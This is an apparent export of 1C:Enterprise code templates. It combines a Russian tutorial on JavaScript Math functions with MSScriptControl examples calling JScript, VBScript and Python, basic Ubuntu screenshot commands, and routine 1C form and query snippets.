В JavaScript степенная функция представлена как Math.pow(), в новом стандарте ES7 был представлен новый оператор возведения в степень - « * * «.

Возведение в степень
Для того, чтобы возвести число в n-ую степень, используйте функцию Math.pow(), где первый аргумент это число, которое будет возведено в степень, второй аргумент это показатель степени:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.pow(3,2)
// 9
Такая форма записи означает 3 в квадрате, или 3 × 3, что приводит к результату 9. Можно привести еще пример, конечно:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.pow(5,3);
// 125
То есть, 5 в кубе, или 5 × 5 × 5, равно 125.

ECMAScript 7 - это следующая версия JavaScript, в принципе, мы можем использовать новый предложенный оператор возведения в степень - * *, такая форма записи может быть более наглядной:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
3 ** 2 
// 9
На данный момент поддержка этого оператора довольно ограниченная, поэтому его не рекомендуется использовать.

Степенная функция может пригодиться в самых разных ситуациях.
Простой пример, вычисление количества секунд в часе: Math.pow (60,2).

Квадратный и кубический корень
Math.sqrt() и Math.cbrt() противоположны функции Math.pow(). Как мы помним, квадратный корень из числа a - число, дающее a при возведении в квадрат.

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.sqrt(9)
// 3
В тоже время кубический корень из числа a - число, дающее a при возведении в куб.

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.cbrt(125)
// 5
Math.cbrt() был введен в спецификацию JavaScript совсем недавно, и поэтому поддерживается только в современных браузерах: Chrome 38+, Firefox и Opera 25+ и Safari 7.1+. Вы заметите, что Internet Explorer отсутствует в этом списке, однако на MDN вы найдете полифилл.

Примеры
Конечно, мы можем использовать и не целые значения в одной из этих функций:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.pow(1.25, 2);
// 1.5625

Math.cbrt(56.57)
// 3.8387991760286138
Обратите внимание, что это вполне себе работает и при использовании отрицательных значениях аргументов:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.pow(-5,2)
// 25

Math.pow(10,-2)
// 0.01
Тем не менее, для квадратного корня это не будет работать:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.sqrt(-9)
// NaN
Из математического анализа мы знаем, что под мнимым числом понимают квадратные корни из отрицательных чисел. И это может привести нас к еще одной технике работы с комплексными числами, но это уже другая история.

Вы можете использовать дробные значения в Math.pow(), чтобы найти квадратные и кубические корни чисел. Квадратный корень использует показатель 0.5:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.pow(5, 0.5); // = Math.sqrt(5) = 5 ** (1/2)
// 2.23606797749979
Однако, из-за капризов с плавающей точкой, вы не можете точно предположить правильный результат:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.pow(2.23606797749979,2)
// 5.000000000000001
В таких ситуациях, вы вам придется прибегать к отсечению знаков у числа или округление до какого-либо значения.

Некоторые, по непонятным причинам в JavaScript путают функцию Math.pow() с Math.exp(), которая является экспоненциальной функцией для чисел, в целом. Примечание: в английском языке «показатель степени» переводится как «exponent», поэтому это скорее относится к англоговорящим, хотя существуют и альтернативные названия показателя степени, такие как index, power.

Математические константы
Работа с математикой в JavaScript облегчается за счет ряда встроенных констант. Эти константы являются свойствами объекта Math. Стоит обратить внимание, что константы пишутся в верхнем регистре, а не CamelCase нотации.

Math.PI
Число Пи - математическая константа, равная отношению длины окружности к длине ее диаметра. Старое название - лудольфово число. Пи - иррациональное число, то есть его значение не может быть точно выражено в виде дроби m/n, где m и n - целые числа. Следовательно, его десятичное представление никогда не заканчивается и не является периодическим. На бумаге популярно использовать его короткую форму записи - 3.14159.

Ваш браузер не может хранить бесконечное число, так что JavaScript округляет число Пи до такого значения 3,141592653589793, что более чем достаточно для большинства задач.

Хотя это число наиболее распространено в задачах на нахождении длин, площади окружности, число Пи также используется в вероятности, статистики, инженерных и естественных науках: это как универсальная константа.

Math.SQRT2
Квадратный корень из числа 2 - положительное вещественное число, которое при умножении само на себя дает число 2. Геометрически корень из 2 можно представить как длину диагонали квадрата со стороной 1 (это следует из теоремы Пифагора). Это было первое известное в истории математики иррациональное число. JavaScript округляет это число до такого значения 1.4142135623730951. (Из-за ошибок округления в JavaScript: Math.SQRT2 * Math.SQRT2 не равно 2).

Math.SQRT1_2
Квадратный корень из 0.5 - это единица, деленная на корень квадратный из 2. И опять же, это иррациональное число.

Простейшими преобразованиями на бумаге мы можем записать это так:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
 √(1/2) = √1 / √2 = 1 / √2 = √2 / 2
Но из-за проблем с плавающей точкой, мы можем получить такой результат:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.SQRT1_2 === Math.sqrt(1/2)
// true

Math.sqrt(2) / 2 === Math.sqrt(1/2)
// true

1 / Math.sqrt(2) === Math.sqrt(1/2)
// false
Math.E
Как ни странно, в математике константа е всегда записывалась в нижнем регистре, в JavaScript же это число используют в верхнем регистре. Число e - основание натурального логарифма, математическая константа, иррациональное и трансцендентное число. Иногда число e называют числом Эйлера или числом Непера. JavaScript округляет его как 2,718281828459045. Число e играет важную роль в дифференциальном и интегральном исчислении, а также во многих других разделах математики.

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.pow(Math.E,1)
// 2.718281828459045

Math.pow(Math.E,2)
// 7.3890560989306495

Math.pow(Math.E,3)
// 20.085536923187664
Натуральный логарифм
Натуральный логарифм - это логарифм по основанию e, где e - иррациональная константа, равная приблизительно 2,718281828. Натуральный логарифм числа x - это показатель степени, в которую нужно возвести число e, чтобы получить x. Math.log(х) - это натуральный из x по основанию e.

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.log(-1); // NaN, out of range
Math.log(0); // -Infinity
Math.log(1); // 0
Math.log(10); // 2.302585092994046
Если вам нужно получить логарифм из y по основанию x:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function getBaseLog(x, y) {
 return Math.log(y) / Math.log(x);
}

getBaseLog(1/5, 5) 
// -1
Однако, из-за особенностей округления чисел с плавающей точкой, ответ получается не всегда точный и только близок к правильному значению:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
 getBaseLog(10, 1000)
// 2.9999999999999996
Math.LN2
Свойство Math.LN2 представляет натуральный логарифм из 2 равный 0.6931471805599453.

Math.LN10
Свойство Math.LN10 представляет натуральный логарифм из 10 равный 2.302585092994046

Math.LOG2E
Свойство Math.LOG2E представляет двоичный логарифм из e равный 1.4426950408889634

Math.LOG10E
Свойство Math.LOG10E представляет десятичный логарифм из e равный 0.4342944819032518

Math.abs, parseInt, parseFloat
Работа с числами в JavaScript может быть куда более сложной, чем кажется. Полученные значения не всегда попадают внутрь ожидаемых диапазонов, иногда результат может оказаться вовсе не тем, что мы ожидали.

Math.abs()
Метод Math.abs() возвращает абсолютное значение числа, что напоминает нам аналогичную математическую функцию модуля числа a.

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let newVal = -57.64;
Math.abs(newVal);

// 57.64
Math.abs(0) всегда возвращает нуль, но если поставить знак минус перед функцией -Math.abs(NUM) мы всегда будем отрицательное значение.

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
-Math.abs(0);
// -0
parseInt()
Мы знаем, что JavaScript понимает, что «15» это строка, а не число и, например, при разборе CSS-свойств средствами JavaScript, или получив какое-либо значение из неподготовленного массива, наши результаты могут получиться непредсказуемыми. Мы могли получить на вход строку представленную как «17px», и для нас это не является редкостью. Вопрос заключается в том, как преобразовать эту строку в фактическое значение и использовать его в дальнейших расчетах.

Синтаксис: parseInt(string, radix);

Функция parseInt преобразует первый переданный ей аргумент в строковый тип, интерпретирует его и возвращает целое число или значение NaN. Результат (если не NaN) является целым числом и представляет собой первый аргумент (string), рассматривающийся как число в указанной системе счисления (radix). Например, основание 10 указывает на преобразование из десятичного числа, 8 - восьмеричного, 16 - шестнадцатеричного и так далее. Если основание больше 10, то для обозначения цифр больше 9 используются буквы. Например, для шестнадцатеричных чисел (основание 16) используются буквы от A до F.

Рассмотрим пример работы с CSS-свойствами, где, условно говоря, мы можем получить такое значение:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let elem = document.body;
let centerPoint = window.getComputedStyle(elem).transformOrigin;
// ""454px 2087.19px""
Мы можем разделить значения по пробелам:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let centers = centerPoint.split("" "");
// [""454px"", ""2087.19px""]
Однако, каждый элемент все еще есть строка, мы можем избавиться от этого применив нашу функцию:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let centerX = parseInt(centers[0], 10);
// 454

let centerY = parseInt(centers[1], 10);
// 2087
Как видите, вторым аргументом мы указываем систему счисления, в которую будет преобразовано число, этот параметр необязательный, но его рекомендуется использовать, в случае, если вы не знаете какая строка поступит на вход.

parseFloat()
Из примера выше, вы наверное заметили, что parseInt отбрасывает дробную часть. В нашем случае, parseFloat умеет работать с числами с плавающей точкой. Опять же, это может быть полезным при разборе CSS и других задачах, особенно при работе с плавающей точкой в процентах.

Синтаксис: parseFloat(string)

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let FP = ""33.33333%"";
console.log(parseFloat(FP));

// 33.33333
Обратите внимание, что в синтаксисе parseFloat нет второго аргумента.

Мы понимаем, что parseInt() и parseFloat() являются чрезвычайно полезными функциями, важно учитывать, что и тут не обойтись без ошибок, поэтому необходимо проверять диапазон ожидаемых значений и в конечном счете анализировать результат, чтобы гарантировать, что полученные значения верны."}
},
{0,
{"Случайные числа массивом (JScript)",0,0,"","Функция ВызватьJScript(Число1, Число2)
	
	Попытка
		ОбъектSC 			= Новый COMОбъект(""MSScriptControl.ScriptControl"");
		ОбъектSC.Language 	= ""JScript"";
	Исключение
		Сообщить(""Объект не создан: "" + ОписаниеОшибки());
		Возврат Неопределено;
	КонецПопытки;
	
	СтрокаJS = ""function RandArr(){var array = new Array(10);
	|for (var i = 0; i < array.length; i++) {
	|    array[i] = Math.random();
	|} return array}"";
	
	
	ОбъектSC.AddCode(СтрокаJS); 
	СтрокаВызоваФункции 	= ""RandArr();"";
	Результат 	= ОбъектSC.Eval(СтрокаВызоваФункции);
	
	Возврат Результат;
	
КонецФункции

Сообщить(""123"");
Р = ВызватьJScript(1,2);
Для каждого м Из Р Цикл
	Сообщить(м);
КонецЦикла;
"}
}
},
{2,
{"Python",1,0,"",""},
{0,
{"MSScriptControl, Python Script Engine (ENG)",0,0,"","Follow these steps carefully

Go to Activestate and get [ActivePython 2.5.7][1] MSI installer.
I had DLL hell problems with 2.6.x
Install in your Windows machine
once install is complete open Command Prompt and go to

C:\Python25\lib\site-packages\win32comext\axscript\client

execute \>  python pyscript.py you should see message Registered: Python

Go to ms office excel and open worksheet

Go to Tools > Macros > Visual Basic Editor
Add a reference to the Microsoft Script control ![alt text][2]
Add a new User Form. In the UserForm add a CommandButton
Switch to the code editor and Insert the following code

Dim WithEvents PyScript As MSScriptControl.ScriptControl

Private Sub CommandButton1_Click()
   If PyScript Is Nothing Then
       Set PyScript = New MSScriptControl.ScriptControl
       PyScript.Language = ""python""
       PyScript.AddObject ""Sheet"", Workbooks(1).Sheets(1)
       PyScript.AllowUI = True
   End If
   PyScript.ExecuteStatement ""Sheet.cells(1,1).value='Hello'""
End Sub
Execute. Enjoy and expand as necessary"}
},
{0,
{"MSScriptControl, Python Script Engine",0,0,"","Python Script Engine не создан в MSScriptControl
Я пытаюсь использовать Python из Excel 2003 с помощью MSScriptControl. Я выполнил все необходимые шаги, как указано в различных темах здесь и в других местах, например:

Установка ActivePython
Добавление ссылки «MSScriptControl 1.0» в VBA в Excel
Регистрация Python, запустив скрипт C: \ Python27 \ Lib \ site-packages \ win32comext \ axscript \ client \ pyscript.py
но я не могу заставить свой код работать на одном ПК (во время работы над другим, где я выполнял те же шаги, что и выше).

Работа с многоэлементными формулами excel на python
Нужна помощь в создании XML из Excel
Pandas dataframe и кодировка символов при чтении файла excel
Чтение определенных столбцов из excel для python
Фильтровать данные Excel на основе выбора диапазона дат на пандах
Вот код в VBA:

Global sc As New MSScriptControl.ScriptControl Public Function calibrate() sc.Language = ""python"" sc.ExecuteStatement (""import SABRSolver"") End Function 
когда я выполняю функцию, она останавливается на sc.Language говоря мне, что «Механизм сценария для указанного языка не может быть создан (Ошибка 380)»

Это действительно сводит меня с ума, поскольку, как сказано, он работает на других машинах с одинаковой настройкой."}
}
},
{0,
{"MSScriptControl.ScriptControl, JScript",0,0,"","Функция ВызватьJScript(Число1, Число2)
	
	Попытка
		лОбъектSC 			= Новый COMОбъект(""MSScriptControl.ScriptControl"");
		лОбъектSC.Language 	= ""JScript"";
	Исключение
		Сообщить(""Объект не создан: "" + ОписаниеОшибки());
		Возврат Неопределено;
	КонецПопытки;
	
	лСтрокаJS = ""function Summa(a, b)
	|{
	|	var c = a + b;
	|	return c;
	|}"";
	
	//лСтрокаJS = ""function Summa(){var array = new Uint32Array(10);
	//|window.crypto.getRandomValues(array);
	//|for (var i = 0; i < array.length; i++) {
	//|    return (array[i]);
	//|}"";
	
	лОбъектSC.AddCode(лСтрокаJS); 
	лСтрокаВызоваМетода 	= ""Summa("" + Число1 + "", "" + Число2 + "");""; //TODO [АйТи КучеровРМ 25.07.2019]: Формировать строку параметров автоматически на основе массива 
	Результат 				= лОбъектSC.Eval(лСтрокаВызоваМетода);	
	
	Возврат Результат;
	
КонецФункции "}
},
{0,
{"MSScriptControl.ScriptControl, VBscript",0,0,"","Функция ВызватьVBscript(Число1, Число2)
	
	Попытка
		лОбъектSC 			= Новый COMОбъект(""MSScriptControl.ScriptControl"");
		лОбъектSC.Language 	= ""VBscript"";
	Исключение
		Сообщить(""Объект не создан: "" + ОписаниеОшибки());
		Возврат Неопределено;
	КонецПопытки;
	
	//лСтрокаJS = ""function Summa(a, b)
	//|{
	//|	var c = a + b;
	//|	return c;
	//|}"";
	
	//лОбъектSC.AddCode(лСтрокаJS); //В примере не использовался
	лСтрокаВызоваМетода 	= ""Asc("""""" + Число1 + """""")"";
	Результат 				= лОбъектSC.Eval(лСтрокаВызоваМетода);	
	
	Возврат Результат;
	
КонецФункции "}
},
{0,
{"Передача массива из 1С в VBscript через COM (MSScriptControl.ScriptControl, VBscript)",0,0,"","Скрипт 			= Новый COMОбъект(""MSScriptControl.ScriptControl"");
Скрипт.Language = ""VBscript"";
Текст 	= ""
|Function TestF(Arr, test)
|    test = Arr(0)
|End Function"";


Массив 	= Новый COMSafeArray(""VT_VARIANT"", 2);
Массив.SetValue(0, 23);

Test 	= 0;
Скрипт.AddCode(Текст);
й		= Скрипт.Run(""TestF"", Массив, Test);
Сообщить(Test);

Еще можно так: 

Массив1 = Новый Массив;
// заполнение массива Массив1 значениями

// ...
Размер 	= Новый Массив;
Размер.Добавить(2);
Размер.Добавить(3);
Массив2 = Новый COMSafeArray(Массив1, ""VT_I4"", Размер);
Массив3 = Новый COMSafeArray(Массив2);"}
}
},
{1,
{"Ubuntu (UNIX)",1,0,"",""},
{5,
{"Команды в терминале (Terminal command line) (файлы для запуска формата *.sh)",1,0,"",""},
{0,
{"Сделать типовой скриншот (через Terminal (Ctrl + Alt + T)) (gnome-screenshot -d xx to delay the action)",0,0,"","gnome-screenshot -d 10

Периодически:
while true; do gnome-screenshot -d 10; done

Для прерывания надо нажать: ""Ctrl + z""."}
},
{0,
{"Открыть сайт",0,0,"","firefox http://www.youtube.com

Или (для запуска из файла под пользователем, чтобы всё нормально с правами, иначе там жесть, даже под root сложно запуститься):
/usr/bin/firefox http://www.youtube.com

Если вызывается из файла *.sh, то надо ткрыть права файлу: на запуск, и поместить в группу администраторов (adm).
"}
},
{0,
{"Скриншот через scrot",0,0,"","sudo apt-get install scrot

while true; do scrot -d int  'filename.jpg|png' -e 'mv $f /file/path/to/store/screenshots'; done
	
while true; do scrot -d 5 '%Y-%m-%d-%H:%M:%S.png' -e 'mv $f ~/Pictures/'; done
	
Для прерывания надо нажать: ""Ctrl + z"".	"}
},
{0,
{"Прервывание выполнения кода (вечных циклов): ""Ctrl + z""",0,0,"","Для прерывания надо нажать в терминале: ""Ctrl + z""."}
},
{0,
{"Дата",0,0,"","echo ""Time is:""
date"}
}
}
},
{0,
{"РегистрСведений_Отбор",0,0,"РСОт[бор]","лНаборЗаписей 	= РегистрыСведений.ИмяРегистра.СоздатьНаборЗаписей(); //Подготавливает пустой контейнер в оперативной памяти, структура которого соответствует структуре регистра в БД
лНаборЗаписей.Отбор.Регистратор.Установить(Значение); //В этот контейнер нужно помещать только те записи, поле ""Регистратор"" которых соответствует значению ""Значение""
лНаборЗаписей.Прочитать(); //Указывается, что необходимо выполнить чтение данных из БД в соответствии с теми условиями которые наложены на контейнер
"}
},
{0,
{"ОбъектДляПередачиНаСервер",0,0,"ОДП[НС]","лОбъектДляПередачиНаСервер 	= Объект;"}
},
{0,
{"ПрогрессБар (Состояние)",0,0,"","&НаКлиенте
Процедура Прогрессор(пСообщение, пВсего, пТекущ)
	
	Если пВсего > 0 Тогда
		лПроцент 	= Цел(пТекущ / пВсего * 100);
		
		Если лПроцент > Цел((пТекущ - 1) / пВсего * 100) Тогда
			лТекстСообщения 	= пСообщение + "": "" + Формат(лПроцент, ""Ч(0)2"") + ""% "" + СтрЗаменить(Формат("""", ""С"" + Мин(99, лПроцент)), "" "", ""l"") + СтрЗаменить(Формат("""", ""С"" + Мин(99, 99 - лПроцент)), "" "", ""'"") + ""l"";
			Состояние(лТекстСообщения, лПроцент, ""Ожидайте""); // Сюда по ситуации можно выводить анекдоты :)
		КонецЕсли;
	КонецЕсли;
	
КонецПроцедуры

// Пример использования
Для ин = 1 По 100000 Цикл
	Если ин % 10 = 0 Тогда // Чтобы вызывать не каждый шаг, а с периодичностью, чтобы не нагружать
		Прогрессор(""Тест"", 100000, ин);
	КонецЕсли;
КонецЦикла;"}
},
{0,
{"ВыбратьФайл (картинку)",0,0,"","&НаКлиенте
Процедура ВыбратьФайл(Команда)
	
	ОбъектКартинка 		= Новый Картинка;
	
	ДиалогВыбораФайла 	= Новый ДиалогВыбораФайла(РежимДиалогаВыбораФайла.Открытие);
	ДиалогВыбораФайла.Фильтр				= ОбъектКартинка.ФильтрИменФайлов();
	ДиалогВыбораФайла.МножественныйВыбор	= Ложь;
	ДиалогВыбораФайла.Заголовок				= ""Выбор картинки"";
	ДиалогВыбораФайла.ПроверятьСуществованиеФайла = Истина;
	
	Если ДиалогВыбораФайла.Выбрать() Тогда
		// Отображение картинки
		ДвоичныеДанные	= Новый ДвоичныеДанные(ДиалогВыбораФайла.ПолноеИмяФайла);
		АдресХранилища	= ПоместитьВоВременноеХранилище(ДвоичныеДанные, ЭтотОбъект.ИдентификаторВладельца);
		//АдресХранилища - реквизит типа Строка на форме в котором можно посмотреть изображение. Ввид элемента - Поле картинки
		
		// Параметры
		Файл 	= Новый Файл(ДиалогВыбораФайла.ПолноеИмяФайла);
		Имя 	= Файл.ИмяБезРасширения;
		
		ЭтотОбъект.Модифицированность 	= Истина;
		ЭтотОбъект.ОбновитьОтображениеДанных();
	КонецЕсли;
	
КонецПроцедуры"}
},
{0,
{"ОбработкаПрерыванияПользователя",0,0,"ОПП","ОбработкаПрерыванияПользователя(); // для прерывания работы встроенного языка при нажатии пользователем клавиши Ctrl+Break"}
},
{0,
{"ПолучитьЗначенияРеквизитов",0,0,"","// Возвращает структуру, содержащую значения реквизитов прочитанные из информационной базы
// по ссылке на объект.
// 
//  Если доступа к одному из реквизитов нет, возникнет исключение прав доступа.
//  Если необходимо зачитать реквизит независимо от прав текущего пользователя,
//  то следует использовать предварительный переход в привилегированный режим.
// 
// Параметры:
//  Ссылка       - ссылка на объект, - элемент справочника, документ, ...
//  ИменаРеквизитов - Строка или Структура - если Строка, то имена реквизитов, 
//               перечисленные через запятую, в формате требований к свойствам структуры.
//               Например, ""Код, Наименование, Родитель"".
//               Если Структура, то в качестве ключа передается псевдоним поля для
//               возвращаемой структуры с результатом, а в качестве значения (опционально) 
//               - фактическое имя поля в таблице. 
//               Если значение не определено, то имя поля берется из ключа.
// 
// Возвращаемое значение:
//  Структура    - содержит список свойств, как список имен в строке
//                 ИменаРеквизитов, со значениям реквизитов, прочитанных
//                 из информационной базы.
// 
Функция ПолучитьЗначенияРеквизитов(Ссылка, ИменаРеквизитов) Экспорт // Из ОбщегоНазначения
	
	Если ТипЗнч(ИменаРеквизитов) = Тип(""Структура"") Тогда
		СтруктураРеквизитов = ИменаРеквизитов;
	ИначеЕсли ТипЗнч(ИменаРеквизитов) = Тип(""Строка"") Тогда
		СтруктураРеквизитов = Новый Структура(ИменаРеквизитов);;
	Иначе
		ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
		НСтр(""ru = 'Неверный тип второго параметра ИменаИлиСтруктураРеквизитов: %1'""), 
		Строка(ТипЗнч(ИменаРеквизитов)));
	КонецЕсли;
	
	ТекстПолей = """";
	Для Каждого КлючИЗначение Из СтруктураРеквизитов Цикл
		ИмяПоля   = ?(ЗначениеЗаполнено(КлючИЗначение.Значение), СокрЛП(КлючИЗначение.Значение), СокрЛП(КлючИЗначение.Ключ));
		Псевдоним = СокрЛП(КлючИЗначение.Ключ);
		ТекстПолей  = ТекстПолей + ?(ПустаяСтрока(ТекстПолей), """", "","") + ""
		|	"" + ИмяПоля + "" КАК "" + Псевдоним;
	КонецЦикла;
	
	Запрос = Новый Запрос(
	""ВЫБРАТЬ
	|"" + ТекстПолей + ""
	|ИЗ
	|	"" + Ссылка.Метаданные().ПолноеИмя() + "" КАК ПсевдонимЗаданнойТаблицы
	|ГДЕ
	|	ПсевдонимЗаданнойТаблицы.Ссылка = &Ссылка
	|"");
	Запрос.УстановитьПараметр(""Ссылка"", Ссылка);
	Выборка = Запрос.Выполнить().Выбрать();
	Выборка.Следующий();
	
	Результат = Новый Структура;
	Для Каждого КлючИЗначение Из СтруктураРеквизитов Цикл
		Результат.Вставить(КлючИЗначение.Ключ);
	КонецЦикла;
	ЗаполнитьЗначенияСвойств(Результат, Выборка);
	
	Возврат Результат;
КонецФункции"}
},
{0,
{"ОпределитьТипОбъекта",0,0,"","// возвращает подробное описание типа объекта
Функция ОпределитьТипОбъекта(Объект)
	
	Строка 	= """" + Объект.Тип;
	Если Строка = ""Строка"" Тогда
		Строка 	= Строка + "", "" + ?(Объект.Тип.КвалификаторыСтроки.Длина = 0, ""Неограниченная"", Объект.Тип.КвалификаторыСтроки.Длина);    
	ИначеЕсли Строка = ""Число"" Тогда
		Строка 	= Строка + "", "" + Объект.Тип.КвалификаторыЧисла.Разрядность + ""."" +
		Объект.Тип.КвалификаторыЧисла.РазрядностьДробнойЧасти;
	ИначеЕсли Не ЗначениеЗаполнено(Строка) Тогда
		Строка 	= """";
	КонецЕсли;    
	
	Возврат Строка;
	
КонецФункции"}
},
{0,
{"ОбновитьФорму через ОбработкаОповещения",0,0,"","Процедура ОбработкаОповещения(ИмяСобытия, Параметр, Источник)
	
	Если ИмяСобытия = ""<?""Имя документа (слитно)"">ОбновитьФормуДокумента"" Тогда 
		ЭтотОбъект.Прочитать(); // Для УФ: ЭтаФорма.Прочитать(); Ещё есть: ЭтаФорма.ОбновитьОтображениеДанных();
		Если ЭтаФорма.Открыта() Тогда
			ЭтаФорма.Обновить(); 
		Иначе
			ЭтаФорма.Открыть();
		КонецЕсли; 
	КонецЕсли;
	
КонецПроцедуры;

Оповестить(""<?""Имя документа (слитно)"">ОбновитьФормуДокумента""); // Перечитать форму"}
},
{0,
{"Программно выполнить процедуры и обработ. событий формы (УФ)",0,0,"","МассивСсылок = ПолучитьМассивСсылокНаВидыЦен();

Для Каждого Строка Из МассивСсылок Цикл
	
	ПараметрыОткрытия 	= Новый Структура(""Ключ"", Строка);
	ФормаОбъекта 		= ПолучитьФорму(""Справочник.ВидыЦен.Форма.ФормаЭлемента"", ПараметрыОткрытия);
	
	ФормаОбъекта.Открыть(); 	// открыли
	ФормаОбъекта.Записать();	// записали
	ФормаОбъекта.Закрыть(); 	// закрыли 
	
КонецЦикла;"}
},
{0,
{"ПолучитьРеквизитМетаданныхОбъекта",0,0,"","Функция ПолучитьРеквизитМетаданныхОбъекта(Объект1С, ИмяРеквизита) Экспорт
	
	Возврат Объект1С.Метаданные()[ИмяРеквизита];
	
КонецФункции
"}
},
{0,
{"Получить макет Объекта формы",0,0,"","&НаСервере
Функция ПолучитьМакетОбъекта(пИмяМакета)
	
	рфОбъектЗначение 	= РеквизитФормыВЗначение(""Объект"");
	лМакет 				= рфОбъектЗначение.ПолучитьМакет(пИмяМакета);
	
	Возврат лМакет;
	
КонецФункции // ПолучитьМакетОбъекта()"}
},
{0,
{"Номер строки итеративно",0,0,"","НомерСтроки 	= ?(НомерСтроки = Неопределено, 0, НомерСтроки + 1); //При повторном использовании в другом месте надо будет обнулить значение, помни"}
},
{0,
{"Картинку из макета в HTML поле",0,0,"","ДвоичныеДанные 	= ПолучитьМакетОбъекта(""Макет""); // В макет загружена картинка
// РеквизитФормыВЗначение(""Объект"").ПолучитьМакет(ИмяМакета)
АдресВХ 		= ПоместитьВоВременноеХранилище(Новый Картинка(ДвоичныеДанные)); 
ТекстРезультата = ""
|<HTML><HEAD>
|<META content=""""text/html; charset=utf-8"""" http-equiv=Content-Type>
|<META name=GENERATOR content=""""MSHTML 11.00.9600.17631""""></HEAD>
|<BODY>тест<img src="" + АдресВХ + ""></BODY></HTML>"";"}
},
{0,
{"Сообщить с разделителем",0,0,"","Сообщить(""<?""Вид разделителя"", ВыборВарианта, ""--------"", ""---------------------------------------------"", ""____"", ""_____________________________________________"", ""===="", ""============================================="", ""******"", ""*********************************************"", ""////"", ""/////////////////////////////////////////////"">"", 	СтатусСообщения.БезСтатуса);
"}
},
{0,
{"ЭтоДокумент",0,0,"","ЭтоДокумент 	= Метаданные.Документы.Содержит(ДокументОбъект.Метаданные());"}
},
{0,
{"КаталогВыгрузки",0,0,"","Если ПустаяСтрока(КаталогВыгрузки) Тогда
	ГСЧ 	= Новый ГенераторСлучайныхЧисел();
	КаталогВыгрузки 	= КаталогВременныхФайлов() + Строка(ГСЧ.СлучайноеЧисло()) + ""\"";
Иначе
	КаталогВыгрузки 	= ОсновныеПараметры.КаталогВыгрузки;
	ПоследнийСимвол 	= Прав(КаталогВыгрузки, 1);
	Если НЕ ПоследнийСимвол = ""\"" Тогда
		КаталогВыгрузки = КаталогВыгрузки + ""\"";
	КонецЕсли;
КонецЕсли;"}
},
{0,
{"ОпределитьКонтекст",0,0,"","Функция ОпределитьКонтекст() Экспорт
	
	#Если ВнешнееСоединение Тогда
		Возврат ""Внешнее соединение"";
	#КонецЕсли
	
	// Клиентов много.
	#Если Клиент Тогда
		#Если МобильноеПриложениеКлиент Тогда
			Возврат ""Мобильное приложение (клиент)"";
		#КонецЕсли
		#Если ВебКлиент Тогда
			Возврат ""Веб-клиент""; 
		#КонецЕсли
		#Если ТонкийКлиент Тогда
			Возврат ""Тонкий клиент"";
		#КонецЕсли
		#Если ТолстыйКлиентУправляемоеПриложение Тогда
			Возврат ""Толстый клиент (управляемоеПриложение)"";
		#КонецЕсли
		#Если ТолстыйКлиентОбычноеПриложение Тогда
			Возврат ""Толстый клиент (обычноеПриложение)"";
		#КонецЕсли
	#КонецЕсли
	
	#Если Сервер Тогда
		#Если МобильноеПриложениеСервер Тогда
			Возврат ""Мобильное приложение (сервер)"";
		#КонецЕсли
		// Так как 1С:Предприятие поддерживает два варианта работы (файловый и клиент-серверный),
		// то отработаем каждый из вариантов.
		Если Лев(СтрокаСоединенияИнформационнойБазы(), 4) = ""File"" Тогда
			// Виртуальный сервер используется в файловом варианте.
			Возврат ""Виртуальный сервер""
		Иначе
			// Реальный сервер используется в клиент-серверном варианте.
			Возврат ""Реальный сервер"";
		КонецЕсли;
	#КонецЕсли
	
КонецФункции"}
},
{0,
{"Команда открытия списка регистра с отбором",0,0,"","// Команда
&НаКлиенте
Процедура ОбработкаКоманды(ПараметрКоманды, ПараметрыВыполненияКоманды)

	ПараметрыФормы = Новый Структура;
	ПараметрыФормы.Вставить(""<?""Имя Элемента Для Отбора (Слитно)"">"", ПараметрКоманды);

	ОткрытьФорму(""РегистрСведений.ИмяРегистра.ФормаСписка"", ПараметрыФормы, ПараметрыВыполненияКоманды.Источник, ПараметрыВыполненияКоманды.Уникальность, ПараметрыВыполненияКоманды.Окно);

КонецПроцедуры

// В форме списка

//Удаляет элемент отбора динамического списка
//
//Параметры:
//Список  - обрабатываемый динамический список,
//ИмяПоля - имя поля компоновки, отбор по которому нужно удалить
//
Процедура УдалитьЭлементОтбораСписка(Список, ИмяПоля)
	
	ЭлементыОтбора = Список.Отбор.Элементы;
	ПолеКомпоновки = Новый ПолеКомпоновкиДанных(ИмяПоля);
	Для Каждого ЭлементОтбора Из ЭлементыОтбора Цикл
		Если ТипЗнч(ЭлементОтбора) = Тип(""ЭлементОтбораКомпоновкиДанных"")
			И ЭлементОтбора.ЛевоеЗначение = ПолеКомпоновки Тогда
			ЭлементыОтбора.Удалить(ЭлементОтбора);
		КонецЕсли;
	КонецЦикла;
	
КонецПроцедуры // УдалитьЭлементОтбораСписка()

//Устанавливает элемент отбор динамического списка
//
//Параметры:
//Список			- обрабатываемый динамический список,
//ИмяПоля			- имя поля компоновки, отбор по которому нужно установить,
//ВидСравнения		- вид сравнения отбора, по умолчанию - Равно,
